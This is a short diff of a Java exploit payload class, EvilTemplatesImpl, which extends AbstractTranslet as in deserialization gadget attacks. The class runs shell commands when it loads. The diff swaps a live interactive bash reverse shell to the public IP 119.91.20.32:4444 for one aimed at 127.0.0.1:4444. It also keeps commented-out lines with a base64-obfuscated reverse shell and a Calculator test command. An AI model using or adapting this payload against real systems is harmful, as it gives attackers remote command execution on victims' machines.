@@ -14,7 +14,7 @@ public class EvilTemplatesImpl extends AbstractTranslet {
 //            Runtime.getRuntime().exec("open -a Calculator");
 //            Runtime.getRuntime().exec("/bin/bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQzIDA+JjE=}|{base64,-d}|{bash,-i}");
 
-            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/119.91.20.32/4444 0>&1"});
+            Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"});
         } catch (Exception e) {
             e.printStackTrace();
         }
